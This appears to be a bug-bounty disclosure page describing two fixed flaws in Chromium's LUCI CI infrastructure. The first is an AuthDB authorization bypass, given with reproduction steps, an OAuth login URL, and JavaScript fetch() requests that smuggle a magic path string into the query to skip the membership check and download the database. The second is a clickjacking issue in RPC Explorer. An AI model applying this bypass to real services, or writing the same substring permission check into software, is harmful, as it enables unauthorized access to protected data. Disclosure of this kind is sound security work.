---
title: Chromium infra
---

# LUCI AuthDB leak (Fixed, Awarded $1000)

LUCI is the CI (Continuous integration) infrastructure for the Chromium project.
This database represents all data used when authorizing incoming requests and handling authentication related tasks: user groups, IP allow lists, OAuth client ID allowlist, etc.

- Login to this URL as any normal google user.
  <https://accounts.google.com/o/oauth2/v2/auth?gsiwebsdk=3&client_id=446450136466-tmlcmovb9hnoh8rhs39846vmmd0rrsl0.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&redirect_uri=https%3A%2F%2Fdefaultv2-dot-chrome-infra-auth.appspot.com%2Fauth%2Fopenid%2Fcallback&prompt=select_account&response_type=token&include_granted_scopes=false&enable_granular_consent=true>

- Copy the `access_token` value from the url hash.
- On that same page, run the following

```js
fetch(
  'https://defaultv2-dot-chrome-infra-auth.appspot.com/auth_service/api/v1/authdb/subscription/authorization?x=/auth_service/api/v1/importer/ingest_tarball/',
  {
    headers: {
      authorization: 'Bearer <token goes here>'
    },
    referrerPolicy: 'strict-origin-when-cross-origin',
    method: 'POST',
    mode: 'cors'
  }
);
```

You should now be granted permission to luci-go AuthDB without being in the "auth-trusted-services" group needed as per <https://pkg.go.dev/go.chromium.org/luci/server/auth/service#AuthService.RequestAccess>

`{"topic":"projects/chrome-infra-auth/topics/auth-db-changed","authorized":true,"gs":{"auth_db_gs_path":"chrome-infra-auth.appspot.com/auth-db","authorized":true}}`

You can also use the API to download the DB.

```js
fetch(
  'https://defaultv2-dot-chrome-infra-auth.appspot.com/auth_service/api/v2/authdb/revisions/latest?x=/auth_service/api/v1/importer/ingest_tarball/',
  {
    headers: {
      authorization: 'Bearer <token>'
    },
    referrerPolicy: 'strict-origin-when-cross-origin',
    method: 'GET',
    mode: 'cors'
  }
);
```

The bypass is that if the URL contains `/auth_service/api/v1/importer/ingest_tarball/` anywhere the permission check gets bypassed.
Code is `strings.Contains(ctx.Request.URL.RequestURI(), "/auth_service/api/v1/importer/ingest_tarball/")`
Otherwise I would get `{"text":"user:ndevtk@protonmail.com is not a member of auth-trusted-services or administrators"}`

This was fixed in <https://chromium-review.googlesource.com/c/infra/luci/luci-go/+/5595490>

# Clickjacking RPC Explorer (Fixed)

Go-based services that has gRPC APIs, import "go.chromium.org/luci/server", and call server.Main
Get a web based user interface for example <https://ci.chromium.org/rpcexplorer/services/> this used to not have embed protection.

This was fixed in <https://chromium-review.googlesource.com/c/infra/luci/luci-go/+/4889788>
